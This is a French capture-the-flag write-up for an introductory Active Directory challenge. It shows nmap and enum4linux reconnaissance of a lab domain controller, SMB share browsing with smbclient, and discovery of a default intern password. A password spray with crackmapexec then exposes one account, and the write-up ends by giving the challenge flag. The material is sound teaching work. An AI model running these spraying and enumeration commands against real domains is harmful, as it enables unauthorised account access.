#  Houston, we have a problem

**Catégorie** : Active Directory/Réaliste  
**Difficulté** : Intro  
**Author**: HF47

## Description du challenge

CTFCORP a récemment accueilli de nouveaux stagiaires. L'équipe de sécurité soupçonne que des mots de passe par défaut n'ont pas été changés. Votre mission : vérifier si ces comptes sont vulnérables à une attaque par password spray et obtenir l'accès aux ressources partagées.

## Solution

### 1. Reconnaissance et découverte réseau

Commençons par une reconnaissance réseau pour identifier les services disponibles :

```bash
hf47@kali> nmap -sV -p- 192.168.56.0/24

map scan report for 192.168.56.4
Host is up (0.00056s latency).
Not shown: 986 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds  Microsoft Windows Server 2016 Essentials microsoft-ds
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

```

Ce scan révèle que nous sommes face à un contrôleur de domaine Windows Server 2016 Essentials avec plusieurs services ouverts, notamment :
- SMB (ports 139/445) pour le partage de fichiers
- LDAP (port 389) pour l'annuaire Active Directory
- Kerberos (port 88) pour l'authentification
- RDP (port 3389) pour l'accès à distance

Examinons plus en détail les services SMB disponibles :

```bash
hf47@kali> enum4linux -a 192.168.56.4

...
[+] Server 192.168.56.4 allows sessions using username '', password ''
[...]
DC1 <20> - File Server Service
CTFCORP <1c> - Domain Controllers
[...]
```
La premiere ligne nous indique que le serveur accepte une connexion SMB avec un compte vide (pas de nom d'utilisateur, pas de mot de passe). Attention, cela ne veut pas dire que nous pouvons lire le contenu des shares mais simplement que l'étape d'authentification passe sans erreur en cas de compte vide. La traduction huamine de cette ligne serait: "Tu peux frapper à la porte sans être jeté immédiatement… mais on t’ouvre pas non plus."

La deuxième ligne nous confirme la présence d'un service `SMB` sur notre Active Directory. 

### 2. Exploration des partages réseau

Commençons par examiner les partages réseau disponibles :

```bash
hf47@kali> smbclient -L //192.168.56.4 -U "<USERNAME>%<PASSWORD>"
```

Nous découvrons deux partages intéressants :
- `Public` (accessible à tous)
- `Stagiaires` (accès en lecture pour notre compte)

### 3. Accès au partage Public

Connectons-nous au partage Public pour chercher des informations :

```bash
hf47@kali> smbclient //192.168.56.4/Public -U '<USERNAME>%<PASSWORD>'
smb: \> ls
  .                                   D        0  Thu May 23 10:15:21 2024
  ..                                  D        0  Thu May 23 10:15:21 2024
  notes_accueil.txt                   A      339  Thu May 23 10:15:21 2024

smb: \> get notes_accueil.txt
getting file \notes_accueil.txt of size 339 as notes_accueil.txt (5.5 KiloBytes/sec) (average 5.5 KiloBytes/sec)
smb: \> exit
```

Examinons le contenu du fichier récupéré :

```bash
hf47@kali> cat notes_accueil.txt

=== NOTES D'ACCUEIL - CTFCORP ===

Bienvenue aux nouveaux arrivants !

Pour les stagiaires: 
- Votre mot de passe initial par défaut est généralement "Bienvenue2024!"
- Vous devez le changer dès votre première connexion si ce n'est pas déjà fait
- Consultez le trombinoscope sur le partage réseau "Stagiaires"
- Votre manager vous contactera dans les 24h

En cas de problème de connexion, contactez le support IT.

--
Équipe RH
CTFCORP
```

Nous découvrons une information cruciale : **les stagiaires utilisent généralement le mot de passe par défaut `Bienvenue2024!`**

### 4. Accès au partage Stagiaires pour trouver les cibles

Connectons-nous maintenant au partage Stagiaires pour identifier les comptes cibles :

```bash
hf47@kali> smbclient //192.168.56.4/Stagiaires -U '<USERNAME>%<PASSWORD>'
smb: \> ls
  .                                   D        0  Thu May 23 10:15:21 2024
  ..                                  D        0  Thu May 23 10:15:21 2024
  trombinoscope.txt                   A      389  Thu May 23 10:15:21 2024
  procedures_stages.txt               A      226  Thu May 23 10:15:21 2024

smb: \> get trombinoscope.txt
getting file \trombinoscope.txt of size 389 as trombinoscope.txt (9.8 KiloBytes/sec) (average 9.8 KiloBytes/sec)
smb: \> exit
```

Examinons le trombinoscope :

```bash
hf47@kali> cat trombinoscope.txt

=== TROMBINOSCOPE DES STAGIAIRES 2024 ===

Département Marketing:
- stagiaire01 - Pierre Dupont - Stagiaire Marketing Digital
- stagiaire02 - Marie Lambert - Stagiaire Communication

Département IT:
- stagiaire03 - Lucas Martin - Stagiaire Développement
- stagiaire04 - Sophie Bernard - Stagiaire Réseaux
- stagiaire05 - Thomas Petit - Stagiaire Cybersécurité

Département Finance:
- stagiaire06 - Julie Moreau - Stagiaire Comptabilité
- stagiaire07 - Alexandre Leroy - Stagiaire Audit

Pour contacter un stagiaire: prenom.nom@ctfcorp.local
```

Nous avons maintenant 7 cibles potentielles pour notre password spray :
- stagiaire01
- stagiaire02
- stagiaire03
- stagiaire04
- stagiaire05
- stagiaire06
- stagiaire07

### 5. Password Spray

À ce stade, nous avons identifié:
- Les comptes cibles (stagiaire01 à stagiaire07)
- Le mot de passe par défaut (`Bienvenue2024!`)

Commençons par créer un fichier contenant les noms d'utilisateurs :

```bash
hf47@kali> echo -e "stagiaire01\nstagiaire02\nstagiaire03\nstagiaire04\nstagiaire05\nstagiaire06\nstagiaire07" > users.txt
```

Puis, effectuons notre password spray avec CrackMapExec et l'option `--no-bruteforce` :

```bash
hf47@kali> crackmapexec smb 192.168.56.4 -u users.txt -p 'Bienvenue2024!' --no-bruteforce
SMB         192.168.56.4    445    DC1              [*] Windows Server 2016 Essentials 14393 x64 (name:DC1) (domain:ctfcorp.local) (signing:True) (SMBv1:True)
SMB         192.168.56.4    445    DC1              [-] ctfcorp.local\stagiaire01:Bienvenue2024! STATUS_LOGON_FAILURE 
SMB         192.168.56.4    445    DC1              [-] ctfcorp.local\stagiaire02:Bienvenue2024! STATUS_LOGON_FAILURE 
SMB         192.168.56.4    445    DC1              [-] ctfcorp.local\stagiaire03:Bienvenue2024! STATUS_LOGON_FAILURE 
SMB         192.168.56.4    445    DC1              [-] ctfcorp.local\stagiaire04:Bienvenue2024! STATUS_LOGON_FAILURE 
SMB         192.168.56.4    445    DC1              [+] ctfcorp.local\stagiaire05:Bienvenue2024! 
```

Un seul compte a gardé le mot de passe par défaut : `stagiaire05` (ironiquement, le stagiaire en cybersécurité). C'est exactement ce qu'on cherchait ! Nous pouvons maintenant nous connecter avec ce compte.

### 6. Accès au partage Stagiaires en tant que stagiaire

Connectons-nous au partage Stagiaires avec le compte `stagiaire05` :

```bash
hf47@kali> smbclient //192.168.56.4/Stagiaires -U 'stagiaire05%Bienvenue2024!'
smb: \> ls
  .                                   D        0  Thu May 23 10:15:21 2024
  ..                                  D        0  Thu May 23 10:15:21 2024
  trombinoscope.txt                   A      389  Thu May 23 10:15:21 2024
  procedures_stages.txt               A      226  Thu May 23 10:15:21 2024

smb: \> get procedures_stages.txt
getting file \procedures_stages.txt of size 226 as procedures_stages.txt (5.8 KiloBytes/sec) (average 5.8 KiloBytes/sec)
smb: \> exit
```

Examinons le document de procédures :

```bash
hf47@kali> cat procedures_stages.txt

=== PROCÉDURES POUR LES STAGIAIRES ===

1. Lors de votre première connexion, changez votre mot de passe par défaut
2. Remplissez la fiche d'accueil (voir modèle sur le partage)
3. Consultez régulièrement votre messagerie professionnelle

Note confidentielle pour les administrateurs:
404CTF{P4ssW0rd_Spr4y_1s_T00_E4sy_F0r_St4g14ir3s}
```

Le flag se trouve dans le document des procédures : `404CTF{P4ssW0rd_Spr4y_1s_T00_E4sy_F0r_St4g14ir3s}`
